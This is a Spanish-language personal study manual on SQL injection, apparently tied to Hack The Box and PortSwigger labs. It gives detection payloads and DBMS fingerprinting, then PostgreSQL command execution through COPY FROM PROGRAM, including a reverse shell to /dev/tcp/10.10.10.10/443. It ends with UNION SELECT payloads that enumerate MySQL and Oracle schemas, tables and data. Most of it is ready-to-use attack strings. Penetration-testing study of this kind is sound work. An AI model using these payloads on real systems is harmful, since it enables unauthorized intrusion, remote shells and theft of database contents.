# SQLI

## Detectar SQLI

Existen varios payloads que podemos probar para detectar un SQLI:

* Comilla simple (') : Suele ser suficiente para detectarlo
* 2 comillas simples ('')
* 3 comillas simples (''') Puede servir para evadir algunos IPS
* Comilla doble (") pocas veces pero puede ocurrir
* Para cadenas de texto -> (%) o (\_) o (||) o (+)
* Para numérico -> (-0) (+0) (-1) (+1)

Hay que tener en cuenta que a la hora de detectarlo podemos probar en formularios, en la URL, en la petición (a través de Burpsuite, etc...) Lo más importante es intentar entender cómo está funcionando por detrás para poder inyectar el SQL de la forma más adecuada.

Sabremos que puede llegar a ser vulnerable por cualquier cambio que observemos:

* Mostrar error
* Cambios en HTML, CSS, Javascript...
* Tamaño diferente de respuesta
* Respuesta HTTP con código diferente
* Cambios de cabecera

### Detectar DBMS

Podemos utilizar algunos Payloads como el tipo de comentario o sentencias concretas:

* /\*! expresión \*/ -> Si se usa en MySQL se ignora el comentario con la exclamación
* LIMIT n -> Se usa en MYSQL
* TOP n -> Equivalente a LIMIT para SQL server
* rownum=n -> En oracle almacena el índice de cada fila de una tabla numerándola de 1 a N

## Error based

La más fácil de detectar ya que nos saltará un error a la hora de intentar inyectar el SQLI.

### POSTGRESQL

#### Ejecución remota de comandos

Con postgresql podemos realizar comandos dentro de la máquina objetivo y sacar el output o directamente establecernos una Reverse Shell.

En primer lugar creamos una tabla que será donde copiemos el output del comando que queramos usar, en este caso "whoami"

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'whoami';--
```

Para ver dicho output lo que tendríamos que hacer es mostrar los datos dentro de la tabla prueba que hemos creado, el siguiente ejemplo es sacado del formulario de búsqueda de la máquina [Vaccine ](../../../HTB/vaccine.md)de Hack The Box:

```
HOLA' UNION SELECT NULL,NULL,NULL,*,NULL FROM prueba--
```

También podríamos sacar una reverse Shell directamente, tenemos que plantear que estamos realizando una ejecución de comandos y viendo el output, pero el comando se está ejecutando por lo que podemos hacer pruebas con las distintas formas de enviar una [reverse shell](../../../herramientas/shell-cheatsheet.md)

```
HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"';--
```

Más info en [https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

## Union Select

Una vez hemos detectado la posible vulnerabilidad una forma de sacar los datos es a través de un Union Select. En primer lugar tenemos que averiguar el número de columnas:

```
-1' order by ?-- - #En Mysql donde '?' tiene que ser un número, el máximo número que te permite sin error es el número de columnas
-1' union select null, null, null-- - #Poniendo tantos null cómo columnas sin que de un error

#En oracle es importante el FROM (dual es una tabla por defecto) También podemos usar order by
-1' union select null, null, null from dual--
```

Una vez hemos detectado cuantas columnas tenemos que utilizar es el momento de determinar en cual puedo imprimir un string, simplemente cambiando null por una palabra "string":

```
-1' union select null,"string",null-- - #Mysql
-1' union select null,"string",null from dual-- #Oracle
```

Con esta información ya podemos empezar a enumerar la base de datos (En mysql):

```
#Los nombres de todas las bases de datos
' union select schema_name, null from information_schema.schemata-- -

#Podemos obtener todas las tablas o aquellas de bases de datos concretas
' union select table_name, null from information_schema.tables where table_schema='nombreBD'-- -

#A continuación columnas
' union select column_name, null from information_schema.columns where table_name='nombretabla' and table_schema='nombreBD'-- -

#Por último los datos
' union select CONCAT(columna1,':',columna2),null from nombretabla-- - 
```

En oracle:

```
#Obtener las tablas
' union select table_name, null from all_tables--

#Obtener las columnas
' union select column_name, null from all_tab_columns where table_name='nombretabla'--

#Obtener los datos
' union select columna1||':'||columna2, null from nombretabla--
```

### Practicar

* Máquinas "[SQLI de Portswigger](../../../portswigger/sql-injection.md)" de Portswigger \[Acceso 06/11/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
